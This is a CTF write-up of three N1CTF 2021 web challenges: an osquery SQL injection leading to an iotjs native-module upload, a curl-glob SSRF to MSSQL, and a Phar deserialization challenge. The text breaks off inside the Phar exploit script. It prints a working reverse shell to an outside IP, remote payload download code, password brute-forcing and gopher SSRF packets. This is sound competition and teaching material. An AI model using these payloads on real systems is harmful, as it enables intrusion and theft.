# N1CTF 2021 Writeup (Web)

Originally from https://harold.kim/blog/2021/11/n1ctf-writeup/.

## Introduction

I wasn't playing CTFs for almost a year due to my health conditions that has been causing me some troubles for a year now.

I also lost some interest in solving CTF challenges during the COVID outbreak... Fortunately, my teammates are really talented enough to break down most challenges so I don't get that motivated to solve any CTF challenges right now.

Since I was asked for an help on web challenges this time, I decided to check out some challenges.

## web

### QQQueryyy All The Things

> Do you like Be----lla？
>
> China Mainland: http://47.57.246.66:12321/?str=world
>
> Others: http://8.218.140.54:12321/?str=world

Unfortunately we couldn't get any source-code for this challenge, but it was obvious to see that SQL injection exists.

<img src=//harold.kim/static/blog/n1ctf-web-1.png>

Looking down a bit, we found that it's something to do with the SQLite.

<img src=//harold.kim/static/blog/n1ctf-web-2.png>

By doing `SELECT * FROM sqlite_temp_schema` we can see some hidden tables that were not available from `sqlite_master`.

After some Google searches with the names from the table list, we can see that this is a database tool by (https://osquery.io/)

<img src=//harold.kim/static/blog/n1ctf-web-3.png>

Later, we also found out that we can possibly read some of running processes within the server.

<img src=//harold.kim/static/blog/n1ctf-web-4.png>

My teammate built a script and sent me some interesting logs of how others were exploiting.

```json
...
  {"cmdline":"tail -f /var/log/apache2/access.log"},
  {"cmdline":"sh -c echo 'SELECT '\\''1'\\'';select * from curl where url='\\''http://127.0.0.1:16324'\\'' and user_agent='\\''\n\n\n\n\n\n\n\n\n\n\n\n\n\nvar chunk=new Buffer(\"\\x50\\xe5\\x74\\x64\\x04\\x00\\x00\\x00\\xb4\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\xb4\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\xb4\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x3c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x3c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x51\\xe5\\x74\\x64\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x52\\xe5\\x74\\x64\\x04\\x00\\x00\\x00\\xf8\\x2d\\x00\\x00\\x00\\x00\\x00\\x00\\xf8\\x3d\\x00\\x00\\x00\\x00\\x00\\x00\\xf8\\x3d\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x47\\x4e\\x55\\x00\\x02\\x00\\x00\\xc0\\x04\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x47\\x4e\\x55\\x00\\xa9\\x1c\\xaf\\xac\\xe6\\x44\\xfe\\x91\\xc4\\x75\\x0b\\xb6\\xcf\\xf5\\xb3\\xb3\\xc7\\x04\\xe3\\x77\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x0b\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x20\\x00\\x00\\x00\\x00\\x0b\\x00\\x00\\x00\\xfd\\x9b\\xbc\\xdc\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xb0\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x5c\\x00\\x00\\x00\\x12\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x7b\\x00\\x00\\x00\\x12\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x00\\x00\\x00\\x12\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x99\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x63\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x2c\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\");var glzjins_girlfriend=require(\"fs\").openSync(\"/tmp/zglzjin_girlfriend4.node\",\"a\");require(\"fs\").writeSync(glzjins_girlfriend, chunk, 0, chunk.length);\n\n\n\n\n\n\n\n\n\n\n//'\\'';select '\\''sqlmap'\\'' as hello;' | osqueryi --json"},
  {"cmdline":"osqueryi --json"},
  {"cmdline":"/src/iotjs/build/x86_64-linux/debug/bin/iotjs /src/iotjs/tools/repl.js"},
  {"cmdline":"sh -c echo 'SELECT '\\''world'\\'';select cmdline from processes;--'\\'' as hello;' | osqueryi --json"},
  {"cmdline":"osqueryi --json"}
...
```

.. and this was where my teammates were stuck. They asked for an help so I decided to take a few more steps to solve the challenge.

From this payload we know that

1. There is some bug in `curl` table where we can write arbitrary header packets.
2. `http://127.0.0.1:16324` runs `repl.js` from iotjs (https://github.com/jerryscript-project/iotjs)
3. The attacker has uploaded some interesting binary data, so I assumed that it may be possible to upload some native modules for iotjs.

From here, all you need is to carefully read the official documentation of iotjs and build your native module by using `node-gyp`.

* https://github.com/jerryscript-project/iotjs/blob/master/docs/devs/Writing-New-Module.md
* https://github.com/jerryscript-project/iotjs/blob/master/docs/api/IoT.js-API-N-API.md

```shell
root@stypr-jpn:~/aaa/iotjs/# npm i -g node-gyp
root@stypr-jpn:~/aaa/iotjs/# python ./iotjs/tools/iotjs-create-module.py --template shared v
... (Some setups from guide) ...
root@stypr-jpn:~/aaa/iotjs/v/src# vi module_entry.c
root@stypr-jpn:~/aaa/iotjs/v/src# cat module_entry.c 
#include <node_api.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <execinfo.h>

static napi_value hello_world(napi_env env, napi_callback_info info) {
  napi_value world;
  const char* str = "Hello world!";
  size_t str_len = strlen(str);
  if (napi_create_string_utf8(env, str, str_len, &world) != napi_ok)
    return NULL;
  return world;
}

napi_value init_v(napi_env env, napi_value exports) {
  napi_property_descriptor desc = { "hello", 0, hello_world,  0,
                                    0,       0, napi_default, 0 };
  system("rm -rf /tmp/styp.node; bash -i >& /dev/tcp/158.101.144.10/12345 0>&1");
  if (napi_define_properties(env, exports, 1, &desc) != napi_ok)
    return NULL;

  return exports;
}

root@stypr-jpn:~/aaa/iotjs/v# node-gyp configure
...
root@stypr-jpn:~/aaa/iotjs/v# node-gyp build
gyp info it worked if it ends with ok
gyp info using node-gyp@8.4.0
gyp info using node@14.18.1 | linux | x64
make: Entering directory '/root/aaa/iotjs/v/build'
gyp info spawn make
gyp info spawn args [ 'BUILDTYPE=Release', '-C', 'build' ]
  CC(target) Release/obj.target/v/src/module_entry.o
../src/module_entry.c: In function ‘init_v’:
../src/module_entry.c:19:3: warning: ignoring return value of ‘system’, declared with attribute warn_unused_result [-Wunused-result]
   system("rm -rf /tmp/styp.node; bash -i >& /dev/tcp/158.101.144.10/12345 0>&1");
   ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  SOLINK_MODULE(target) Release/obj.target/v.node
  COPY Release/v.node
root@stypr-jpn:~/aaa/iotjs/v/build/Release# ls -al
total 28
drwxr-xr-x 4 root root 4096 Nov 21 01:54 .
drwxr-xr-x 3 root root 4096 Nov 21 01:23 ..
drwxr-xr-x 3 root root 4096 Nov 21 01:32 .deps
drwxr-xr-x 3 root root 4096 Nov 21 01:54 obj.target
-rwxr-xr-x 2 root root 8336 Nov 21 01:54 v.node
```

Now, with the created `v.node` file, you can now create an exploit code to upload `v.node` file to the server and let the arbitrary code execute in remote.

```python
#!/usr/bin/python
#-*- coding: utf-8 -*-
import requests
import random
import base64


# SQL Injection
url = "http://47.57.246.66:12321/?str=world';{};--"
# Payload from other team
payload = "select group_concat(result)from curl where url='http://127.0.0.1:16324' and user_agent='\n\n\n\n\n\n\n\n\n\n\n\n\n\n{node}\n\n\n\n\n\n\n\n\n\n\n'"


"""
Write native module to server

fs = require("fs");
http = require("http")

f = fs.openSync("/tmp/styp.node", "w")
http.get({
    host: "158.101.144.10",
    port: 80,
    path: "/styp.node?exp"
}, function(resp){
    resp.on("data", function(exploit){
        fs.writeSync(f, exploit, 0, exploit.length)
    });
    resp.on("end", function(){
        fs.closeSync(f)
        process.exit(1)
    });
});
"""
gadget_init = "fs=require(\"fs\");f=fs.openSync(\"/tmp/styp.node\",\"w\");http=require(\"http\");http.get({ host:\"158.101.144.10\",port:80,path:\"/styp.node?q\"},function(r){r.on(\"data\",function(c){fs.writeSync(f, nc, 0, c.length);});r.on(\"end\", function(){fs.closeSync(f);process.exit(1);})});"
payload_init = payload.format(node=gadget_init)

r = requests.get(url.format(payload_init))
print(r.text)

"""
Run my native module

sty = require("/tmp/styp.node")
console.log(sty)
"""
gadget_shell = "sty=require(\"/tmp/styp.node\");console.log(sty);"
payload_shell = payload.format(node=gadget_shell)

r = requests.get(url.format(payload_shell))
print(r.text)

```

With this, you can easily get the system shell in the remote server.

However, the challenge author has set `alarm()` on `/readflag` to prevent any unexpected solutions, so I had to write some custom python code to automate the `/readflag` stdin to retrieve the flag.

```shell
root@stypr-jpn:/tmp# nc -vlp 12345
Listening on [0.0.0.0] (family 0, port 12345)
Connection from 8.218.140.54 43570 received!
bash: cannot set terminal process group (165270): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
ctf@cb449efe1f34:/$  python -c "import pty; pty.spawn('/bin/bash')"
 python -c "import pty; pty.spawn('/bin/bash')"
bash: /root/.bashrc: Permission denied
ctf@cb449efe1f34:/$ cd /
cd /
ctf@cb449efe1f34:/$ ls -la
ls -la
total 456
drwxr-xr-x   1 root root   4096 Nov 19 15:13 .
drwxr-xr-x   1 root root   4096 Nov 19 15:13 ..
-rwxr-xr-x   1 root root      0 Nov  7 21:45 .dockerenv
drwxr-xr-x   1 root root   4096 Nov 19 15:15 bin
drwxr-xr-x   2 root root   4096 Apr 24  2018 boot
drwxr-xr-x   5 root root    340 Nov 20 22:10 dev
drwxr-xr-x   1 root root   4096 Nov  7 21:45 etc
-r-x------   1 root root     71 Nov  7 21:03 flag
drwxr-xr-x   1 root root   4096 Nov  7 21:42 home
drwxr-xr-x   1 root root   4096 Nov  7 21:40 lib
drwxr-xr-x   2 root root   4096 Nov  7 21:40 lib32
drwxr-xr-x   2 root root   4096 Sep 30 20:33 lib64
drwxr-xr-x   2 root root   4096 Sep 30 20:32 media
drwxr-xr-x   2 root root   4096 Sep 30 20:32 mnt
drwxr-xr-x   1 root root   4096 Nov  7 21:40 opt
dr-xr-xr-x 195 root root      0 Nov 20 22:10 proc
-r-sr-xr-x   1 root root  13144 Nov  7 18:23 readflag
drwx------   1 root root   4096 Nov 21 01:02 root
drwxr-xr-x   1 root root   4096 Nov 20 22:10 run
drwxr-xr-x   1 root root   4096 Nov  8 14:24 sbin
dr-xr-xr-x   1 root root   4096 Nov  7 21:42 src
drwxr-xr-x   2 root root   4096 Sep 30 20:32 srv
dr-xr-xr-x  13 root root      0 Nov 20 23:16 sys
drwxrwxrwt   1 root root 348160 Nov 21 01:29 tmp
drwxr-xr-x   1 root root   4096 Nov  7 21:40 usr
drwxr-xr-x   1 root root   4096 Nov  7 21:41 var
ctf@cb449efe1f34:/$ python -c 'from subprocess import Popen, PIPE, STDOUT;p=Popen(["/readflag"], stdout=PIPE, stdin=PIPE, stderr=STDOUT);print(p.stdout.readline());ans=str(eval(p.stdout.readline().strip()));print(ans);p.stdin.write(ans+"\n");print(p.stdout.readline());print(p.stdout.readline());print(p.stdout.readline());'
<t(p.stdout.readline());print(p.stdout.readline());'
Solve the easy challenge first

-2542215
input your answer: ok! here is your flag!!

n1ctf{3894619c1b94abe1df7fa7948fa5028a5eba3b98408624ebc02163ad72382c39}

ctf@cb449efe1f34:/$ 
```


### Funny_Web

> 1: 1.13.194.226
>
> 2: 129.226.12.144
>
> hint1-The web server is not running on docker

I think this was one of the interesting yet tedious challenge to solve.

The vulnerability itself is interesting and simple, but it took some time to write the exploit for this challenge.

We get the service's sourcecode upon accessing the page.

```php 
<?php
session_start();
//hint in /hint.txt
if (!isset($_POST["url"])) {
    highlight_file(__FILE__);
}

function uuid()
{
    $chars = md5(uniqid(mt_rand(), true));
    $uuid = substr($chars, 0, 8) . '-'
        . substr($chars, 8, 4) . '-'
        . substr($chars, 12, 4) . '-'
        . substr($chars, 16, 4) . '-'
        . substr($chars, 20, 12);
    return $uuid;
}

function Check($url)
{
    $blacklist = "/l|g|[\x01-\x1f]|[\x7f-\xff]|['\"]/i";

    if (is_string($url)
        && strlen($url) < 4096
        && !preg_match($blacklist, $url)) {
        return true;
    }
    return false;
}

if (!isset($_SESSION["uuid"])) {
    $_SESSION["uuid"] = uuid();
}

echo $_SESSION["uuid"]."</br>";

if (Check($_POST["url"])) {
    $url = escapeshellarg($_POST["url"]);
    $cmd = "/usr/bin/curl ${url} --output - -m 3 --connect-timeout 3";
    echo "your command: " . $cmd . "</br>";
    $res = shell_exec($cmd);
} else {
    die("error~");
}

if (strpos($res, $_SESSION["uuid"]) !== false) {
    echo $res;
} else {
    echo "you cannot get the result~";
}

```

After testing for 30 minutes, My teammate [@CurseRed](https://twitter.com/CurseRed) brought me some ideas to bypass the method.

If you look at the topmost of the curl's official manpage (https://curl.se/docs/manpage.html), we see something like the following.

```
The URL syntax is protocol-dependent. You find a detailed description in RFC 3986.

You can specify multiple URLs or parts of URLs by writing part sets within braces and quoting the URL as in:

  "http://site.{one,two,three}.com"
or you can get sequences of alphanumeric series by using [] as in:

  "ftp://ftp.example.com/file[1-100].txt"
  "ftp://ftp.example.com/file[001-100].txt"    (with leading zeros)
  "ftp://ftp.example.com/file[a-z].txt"
Nested sequences are not supported, but you can use several ones next to each other:

  "http://example.com/archive[1996-1999]/vol[1-4]/part{a,b,c}.html"
```

Here, my teammate suggested a method to bypass the strpos check at the bottom of the source code by sending like the following parameter.

```
url={http://127.0.0.1/,08b788c8-c7f4-885d-d4d0-78f89fb8c766}
```

The problem he had was that we wanted to load `file:///hint`, but the character `l` was blocked by the regex check.

<img src=//harold.kim/static/blog/n1ctf-web-5.png>

Looking back at the curl's official documentation, I found that we can still utilize `[a-z]` and bypass the character check easily.

For example, `fi[j-m]e:///{hint.txt,47ac392a-46d9-522d-b854-1af5fb248eba}` will eventually load all URLs from the following locations.

* `fije:///hint.txt`
* `fije:///{uuid}`
* `file:///hint.txt`
* `file:///{uuid}`
* `fime:///hint.txt`
* `fime:///{uuid}`

```
47ac392a-46d9-522d-b854-1af5fb248eba</br>
your command: /usr/bin/curl 'fi[j-m]e:///{hint.txt,47ac392a-46d9-522d-b854-1af5fb248eba}' --output - -m 3 --connect-timeout 3</br>
--_curl_--fije:///hint.txt
--_curl_--fije:///47ac392a-46d9-522d-b854-1af5fb248eba
--_curl_--fike:///hint.txt
--_curl_--fike:///47ac392a-46d9-522d-b854-1af5fb248eba
--_curl_--file:///hint.txt
mssql_host：10.11.22.9
mssql_port：1433
mssql_username：sa
mssql_password in /password.txt
flag in HKEY_LOCAL_MACHINE\SOFTWARE\N1CTF2021
--_curl_--file:///47ac392a-46d9-522d-b854-1af5fb248eba
--_curl_--fime:///hint.txt
--_curl_--fime:///47ac392a-46d9-522d-b854-1af5fb248eba
```

I assumed that the content of `password.txt` would be simple but... it was a long list of UUID-like passwords in it.

This implies that we also need to bruteforce the password to get into the server.

<img src=//harold.kim/static/blog/n1ctf-web-6.png>


Now, the next step would be accessing MSSQL server, which took the longest time amongst all other web challenges.

Unfortunately, we only could find two resources that were useful to achieve SSRF on MSSQL.

1. impacket's MSSQL (https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)
2. 35C3 Post Writeup (https://ctftime.org/writeup/12808)


My initial decision was to port all impacket's MSSQL interface and craft packets.

I actually finished porting all of these codes but it didn't seem to work properly.

``` python
root@stypr-jpn:~/aaa/funny# cat craft.py
...
...
if __name__ == "__main__":
    # 10.11.22.9 , 1443, sa
    # HKEY_LOCAL_MACHINE\SOFTWARE\N1CTF2021
    print(prelogin())
    # def login(server, database, username, password='', domain='', hashes = None, useWindowsAuth = False):
    print(login('10.11.22.9', None, 'sa', password='123456'))
    print(exec_query("SELECT 1337")) # Note: 2 bytes needs to be added on top of it, gopher adds \r\n

root@stypr-jpn:~/aaa/funny# python3 craft.py 
b'\x12\x01\x00/\x00\x00\x00\x00\x00\x00\x15\x00\x06\x01\x00\x1b\x00\x01\x02\x00\x1c\x00\x07\x03\x00#\x00\x04\xff\x08\x00\x01U\x00\x00\x00mssql5\x00\x93\xe0\x00\x00'
b"\x10\x01\x00\xb2\x00\x00\x01\x00\xaa\x00\x00\x00\x00\x00\x00q\xfb\x7f\x00\x00\x00\x00\x00\x07'\x00\x00\x00\x00\x00\x00\x00\xe0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00V\x00\x08\x00f\x00\x02\x00j\x00\x06\x00v\x00\x08\x00\x86\x00\n\x00\x00\x00\x00\x00\x9a\x00\x08\x00\xaa\x00\x00\x00\xaa\x00\x00\x00\x01\x02\x03\x04\x05\x06\xaa\x00\x00\x00\xaa\x00\x00\x00S\x00K\x00W\x00j\x00y\x00c\x00t\x00m\x00s\x00a\x00\xb6\xa5\x86\xa5\x96\xa5\xe6\xa5\xf6\xa5\xc6\xa5R\x00O\x00w\x00T\x00D\x00E\x00K\x00z\x001\x000\x00.\x001\x001\x00.\x002\x002\x00.\x009\x00R\x00O\x00w\x00T\x00D\x00E\x00K\x00z\x00"
b'\x01\x01\x00(\x00\x00\x01\x00S\x00E\x00L\x00E\x00C\x00T\x00 \x001\x003\x003\x007\x00;\x00-\x00-\x00 \x00-\x00'
```

... Later I realized that impacket's MSSQL client didn't work properly on some of latest SQL servers. I wasted a lot of time from doing this.

But on the other hand, I learnt how MSSQL authentication protocol works. From here, I decided to just manually modify packets from 35C3's exploit code and craft packets.

Since the password length is the same in the `password.txt`, all I needed is to capture a valid authentication packet with the password of same length. As we see on the sourcecode below, `encryptPassword` does not change the length so you don't need to change password offsets from the header data.

```php
<?php

// Ported from impacket's encryptPassword.
// As you see, encrypting password does not change the size, so it is much easier to craft the packet.
function encryptPassword($password){
    $result = "";
    for($i=0;$i<strlen($password);$i++){
        $tmp = ord($password[$i]);
        // echo $tmp;
        $tmp = ((($tmp & 0x0f) << 4) + (($tmp & 0xf0) >> 4)) ^ 0xa5;
        $result .= chr($tmp);
    }
    return $result;
}

$username = "sa";
$password = $argv[1]; // "d0e7a7fa-6b75-4998-a87d-736170a03110";
$username = mb_convert_encoding($username, "utf-16le");
$password = mb_convert_encoding($password, "utf-16le");
$password = encryptPassword($password);
$password_len = strlen($password) / 2;
$password_len = chr(dechex($password_len));

// From 35C3's Post Challenge
$prelogin_packet  = "\x12\x01\x00\x2f\x00\x00\x01\x00";
$prelogin_packet .= "\x00\x00\x1a\x00\x06\x01\x00\x20";
$prelogin_packet .= "\x00\x01\x02\x00\x21\x00\x01\x03";
$prelogin_packet .= "\x00\x22\x00\x04\x04\x00\x26\x00";
$prelogin_packet .= "\x01\xff\x00\x00\x00\x01\x00\x01";
$prelogin_packet .= "\x02\x00\x00\x00\x00\x00\x00";

// Login Packet
// All you need is to find the offset of the password, and replace the packet data with our input.
$login_packet = hex2bin("1001010b0000010003010000040000740010000000000000939f000000000000f0000008e0010000090400005e0006006a0002006e002400b6000a00ca000900dc000400e1000700ef000a0003010000010203040506030100000301000003010000000000007500620075006e007400750073006100");
$login_packet .= $password;
$login_packet .= hex2bin("6e006f00640065002d006d007300730071006c006c006f00630061006c0068006f0073007400e0000000ff54006500640069006f0075007300750073005f0065006e0067006c00690073006800");

// Sending Query
// This may not be stable sometimes so make sure to adjust your packets a bit.
$query = $argv[2] . ";-- -";
$query = mb_convert_encoding($query, "utf-16le");
$length = strlen($query) + 30 + 2;
$query_packet  = "\x01\x01" . pack("n", $length) . "\x00\x00\x01\x00";
$query_packet .= "\x16\x00\x00\x00\x12\x00\x00\x00";
$query_packet .= "\x02\x00\x00\x00\x00\x00\x00\x00";
$query_packet .= "\x00\x00\x01\x00\x00\x00";
$query_packet .= $query;

$payload = $prelogin_packet . $login_packet . $query_packet;
$result = "" . str_replace("+","%20",urlencode($payload)) . "";
echo $result;
// system("curl '$result'  --output - -m 3 --connect-timeout 3");

?>
```

With this, we can now bruteforce for passwords in SQL Server.

As already described in the hint, it is possible to retrieve the secret information by reading registry. so executing `master.sys.xp_regenumvalues` will populate the flag.

```python
import os
import requests

def leak_password():
    """ Leaks the content of file:///password.txt """
    hash = "7b3ba344-2974-c748-8558-102060de0902"
    d = {
        "url": "fi[j-m]e:///{password.txt,"+hash+"}"
    }
    h = {
        "Cookie": "PHPSESSID=rhi443hsuiglkntgqf7vgdpf8l",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    # print(requests.post("https://fo.ax/f.php",  data=d, headers=h).text)
    r = requests.post("http://129.226.12.144/index.php", headers=h, data=d)
    print(r.headers)
    return r.text

def ssrf_bruteforce():
    """ Bruteforce for the password """
    # Password is 32367d71-af9b-4996-852f-f5566c13971a

    password_list = []
    with open("password.txt", "r") as f:
        password_list = [i.strip() for i in f.read().split() if i]

    for password in password_list:
        _res = os.popen(f"php gen_payload.php {password} \"SELECT 'ASDFASDF'\"").read()
        # This is to bypass the l, g
        _res = _res.replace("l", "%6C").replace("g", "%67")
        _res = _res.replace("L", "%4C").replace("G", "%47")

        hash = "7b3ba344-2974-c748-8558-102060de0902"
        d = {"url": "[f-h]opher://10.11.22.9:1433/A{"+_res+","+hash+"}"}
        h = {
            "Cookie": "PHPSESSID=rhi443hsuiglkntgqf7vgdpf8l",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        r = requests.post("http://129.226.12.144/index.php", headers=h, data=d)
        print(r.headers)
        t = r.text
        # Check if invalid authentication message does not exist
        if "\x00\x69\x00\x6c\x00\x65\x00\x64\x00\x20\x00\x66\x00\x6f\x00\x72" not in t:
            print(">>>>>>>>>" + password)
            exit(0)

def ssrf_run_cmd():
    password = "32367d71-af9b-4996-852f-f5566c13971a"
    _res = os.popen(f"php gen_payload.php {password} \"EXECUTE master.sys.xp_regenumvalues 'HKEY_LOCAL_MACHINE','Software\\N1CTF2021'\"").read()
    #  _res = os.popen(f"php gen_payload.php {password} \"EXECUTE master.sys.xp_regread 'AAAAAAAAAAAAAAAAAAAAA'\"").read()
    # This is to bypass the l, g
    _res = _res.replace("l", "%6C").replace("g", "%67")
    _res = _res.replace("L", "%4C").replace("G", "%47")

    hash = "7b3ba344-2974-c748-8558-102060de0902"
    d = {"url": "[f-h]opher://10.11.22.9:1433/A{"+_res+","+hash+"}"}
    h = {
        "Cookie": "PHPSESSID=rhi443hsuiglkntgqf7vgdpf8l",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    r = requests.post("http://129.226.12.144/index.php", headers=h, data=d)
    t = r.text
    return t

if __name__ == "__main__":
    # print(leak_password())
    # print(ssrf_bruteforce())
    print(ssrf_run_cmd())

```

Running the script will populate the flag from the registry.

```
...
--_curl_--fopher://10.11.22.9:1433/Ad93152cc-1a4d-877b-e0ba-d1748ca3ae4e
--_curl_--gopher://10.11.22.9:1433/A%12%01%00%2F%00%00%01%00%00%00%1A%00%06%01%00%20%00%01%02%00%21%00%01%03%00%22%00%04%04%00%26%00%01%FF%00%00%00%01%00%01%02%00%00%00%00%00%00%10%01%01%0B%00%00%01%00%03%01%00%00%04%00%00t%00%10%00%00%00%00%00%00%93%9F%00%00%00%00%00%00%F0%00%00%08%E0%01%00%00%09%04%00%00%5E%00%06%00j%00%02%00n%00%24%00%B6%00%0A%00%CA%00%09%00%DC%00%04%00%E1%00%07%00%EF%00%0A%00%03%01%00%00%01%02%03%04%05%06%03%01%00%00%03%01%00%00%03%01%00%00%00%00%00%00u%00b%00u%00n%00t%00u%00s%00a%00%96%A5%86%A5%96%A5%C6%A5%D6%A5%E3%A5%D6%A5%B6%A5w%A5%B3%A5%C3%A56%A5%83%A5w%A5%E6%A56%A56%A5%C6%A5w%A5%26%A5%F6%A5%86%A5%C3%A5w%A5%C3%A5%F6%A5%F6%A5%C6%A5%C6%A5%93%A5%B6%A5%96%A56%A5%D6%A5%B6%A5%B3%A5n%00o%00d%00e%00-%00m%00s%00s%00q%00%6C%00%6C%00o%00c%00a%00%6C%00h%00o%00s%00t%00%E0%00%00%00%FFT%00e%00d%00i%00o%00u%00s%00u%00s%00_%00e%00n%00%67%00%6C%00i%00s%00h%00%01%01%00%C4%00%00%01%00%16%00%00%00%12%00%00%00%02%00%00%00%00%00%00%00%00%00%01%00%00%00E%00X%00E%00C%00U%00T%00E%00%20%00m%00a%00s%00t%00e%00r%00.%00s%00y%00s%00.%00x%00p%00_%00r%00e%00%67%00e%00n%00u%00m%00v%00a%00%6C%00u%00e%00s%00%20%00%27%00H%00K%00E%00Y%00_%00%4C%00O%00C%00A%00%4C%00_%00M%00A%00C%00H%00I%00N%00E%00%27%00%2C%00%27%00S%00o%00f%00t%00w%00a%00r%00e%00%5C%00N%001%00C%00T%00F%002%000%002%001%00%27%00%3B%00-%00-%00%20%00-%00
+ !""���<�astermaster�lE%Changed database context to 'master'.
10_11_22_9�     �4� 
us_english�pG'Changed language setting to us_english.
10_11_22_9�6tMicrosoft SQL Server��40964096��<���	�4Value��	�4Data�"flll111aaaAAAgGGGFn1ctf{CuURLLL_i111ssS_soOO0_FuUUnN}��y��--_curl_--gopher://10.11.22.9:1433/Ad93152cc-1a4d-877b-e0ba-d1748ca3ae4e
...
```

We succeeded to get the first blood on this challenge. Nice!

<img src=//harold.kim/static/blog/n1ctf-web-7.jpg>


### Easyphp

> http://43.155.59.185:53340/

This challenge was about loading an arbitrary object with the Phar metadata to load `Flag()` class and retrieve the flag.  This can be triggered from `file_exists()` function.

More info avaiable on https://wiki.php.net/rfc/phar_stop_autoloading_metadata and probably also on some CTF challenges.

Challenge sourcecode as follows:

```php

--- index.php

<?php
//include_once "flag.php";
CLASS FLAG {
    private $_flag = 'n1ctf{************************}';
    public function __destruct(){
        echo "FLAG: " . $this->_flag;
    } 
}

include_once "log.php";

if(file_exists(@$_GET["file"])){
    echo "file exist!";
}else{
    echo "file not exist!";
}

?>

--- log.php

<?php
define('ROOT_PATH', dirname(__FILE__));

$log_type = @$_GET['log_type'];
if(!isset($log_type)){
    $log_type = "look";
}

$gets = http_build_query($_REQUEST);

$real_ip = $_SERVER['REMOTE_ADDR'];
$log_ip_dir = ROOT_PATH . '/log/' . $real_ip;

if(!is_dir($log_ip_dir)){
    mkdir($log_ip_dir, 0777, true);
}

$log = 'Time: ' . date('Y-m-d H:i:s') . ' IP: [' . @$_SERVER['HTTP_X_FORWARDED_FOR'] . '], REQUEST: [' . $gets . '], CONTENT: [' . file_get_contents('php://input') . "]\n";
$log_file = $log_ip_dir . '/' . $log_type . '_www.log';

file_put_contents($log_file, $log, FILE_APPEND);

?>
```

All we need is to write on the `log.php` with Phar data on the right time and load the content in the server.

First, we make a script that creates PharData with `Flag` class as a metadata.
```php
<?php

error_reporting(0);
CLASS FLAG {
    public function __destruct(){
        echo "FLAG: " . $this->_flag;
    }
}

@unlink("get_flag.tar");
$phar = new PharData("get_flag.tar");
$phar["ABCDstypr"] = "GETFLAGGETFLAG";
$obj = new FLAG();
$phar->setMetadata($obj);

echo date("Y-m-d H:i:s", time());
```

Then the next step is to modify the checksum and make it look like a valid Phar file.

There is an amazing blog post about this attack so worth checking this blog post for more detailed information.
* https://blog.shpik.kr/php,/unserialize,/rce/2019/02/18/PHP_Exploitation_using_FILE_Function.html

```python
# NOTE: python2
import os
import sys
import struct
import requests
from datetime import datetime

def calc_checksum(data):
    return sum(struct.unpack_from("148B8x356B",data))+256

if __name__=="__main__":
    # generate date and phar content
    generated_date = os.popen("php exp_gen.php").read().split("FLAG: ")[0]
    generated_type = "styp979"
    generated_metadata = "Time: " + generated_date + " IP: [], REQUEST: [log_type=" + generated_type + "], CONTENT: ["

    # make it into phar format
    with open("get_flag.tar", "rb") as f:
        data = f.read()
    new_name = generated_metadata.ljust(100,'\x00').encode()
    new_data = new_name + data[100:]
    checksum = calc_checksum(new_data)
